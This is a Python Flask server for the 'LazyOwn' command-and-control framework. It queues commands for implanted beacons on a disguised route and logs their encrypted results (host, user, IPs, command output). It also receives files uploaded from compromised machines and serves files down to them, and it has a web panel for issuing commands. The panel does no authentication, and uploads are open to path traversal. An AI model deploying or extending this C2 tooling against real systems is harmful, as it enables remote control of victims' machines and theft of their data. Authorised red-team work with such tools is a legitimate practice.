#!/usr/bin/env python3
"""
LazyOwn C2 solo beacon (compatible con beacons anteriores)
argv: <puerto> <usuario> <contraseña>
"""

import os, json, base64, sqlite3, time, ssl, logging
from flask import Flask, request, Response, jsonify
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ---------- CONFIG ----------
AES_KEY    = open("key.aes", "rb").read()
USERNAME   = None
PASSWORD   = None
UPLOAD_DIR = "sessions/uploads"
DB_PATH    = "sessions/beacon.db"
ROUTE      = "/pleasesubscribe/v1/users/"   # << mismo route_maleable
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ---------- CRYPTO ----------
def encrypt_data(data: bytes) -> str:
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
    enc = cipher.encryptor().update(data) + cipher.encryptor().finalize()
    return base64.b64encode(iv + enc).decode()

def decrypt_data(b64data: str, is_file=False):
    raw = base64.b64decode(b64data)
    iv, ct = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
    dec = cipher.decryptor().update(ct) + cipher.decryptor().finalize()
    return dec if is_file else dec.decode()

# ---------- DB ----------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""CREATE TABLE IF NOT EXISTS results(
                        client_id TEXT, os TEXT, pid TEXT, hostname TEXT,
                        ips TEXT, user TEXT, command TEXT, output TEXT, ts TEXT)""")
    conn.commit(); conn.close()
init_db()

# ---------- FLASK ----------
app  = Flask(__name__)
cmds = {}   # client_id -> command

# ---- mismo endpoint de siempre ----
@app.route(f"{ROUTE}<client_id>", methods=["GET"])
def send_command(client_id):
    cmd = cmds.pop(client_id, "")
    return Response(encrypt_data(cmd.encode()), mimetype="application/octet-stream")

@app.route(f"{ROUTE}<client_id>", methods=["POST"])
def recv_result(client_id):
    try:
        data = json.loads(decrypt_data(request.get_data()))
        conn = sqlite3.connect(DB_PATH)
        conn.execute("INSERT INTO results VALUES (?,?,?,?,?,?,?,?,?)",
             (client_id, data["client"], data["pid"], data["hostname"],
                      data["ips"], data["user"], data["command"], data["output"],
                      time.strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
        return jsonify(status="success"), 200
    except Exception as e:
        return jsonify(status="error", msg=str(e)), 500

# ---- upload / download ----
@app.route(f"{ROUTE}upload", methods=["POST"])
def upload():
    try:
        filename = request.headers.get("X-Filename", "unknown.bin")
        data = decrypt_data(request.get_data(), is_file=True)
        with open(os.path.join(UPLOAD_DIR, filename), "wb") as f:
            f.write(data)
        return jsonify(status="uploaded", filename=filename)
    except Exception as e:
        return jsonify(status="error", msg=str(e)), 500

@app.route(f"{ROUTE}download/<filename>", methods=["GET"])
def download(filename):
    path = os.path.join(UPLOAD_DIR, filename)
    if not os.path.exists(path):
        return jsonify(status="not_found"), 404
    with open(path, "rb") as f:
        return Response(encrypt_data(f.read()), mimetype="application/octet-stream")

# ---- panel web simple (opcional) ----
from flask import render_template_string
@app.route("/", methods=["GET", "POST"])
def panel():
    if request.method == "POST":
        client_id = request.form["client_id"]
        command   = request.form["command"]
        cmds[client_id] = command
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute("SELECT * FROM results ORDER BY ts DESC LIMIT 50").fetchall()
    conn.close()
    return render_template_string("""
    <form method=post>
    Cliente: <input name=client_id><br>
    Comando: <input name=command><br>
    <input type=submit value=Enviar></form>
    <hr><pre>{{ rows }}</pre>
    """, rows=rows)

# ---------- MAIN ----------
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print("Uso:", sys.argv[0], "<puerto> <usuario> <contraseña>")
        sys.exit(1)
    lport, USERNAME, PASSWORD = sys.argv[1], sys.argv[2], sys.argv[3]
    app.run(host="0.0.0.0", port=int(lport),
            ssl_context=("cert.pem", "key.pem"), threaded=True)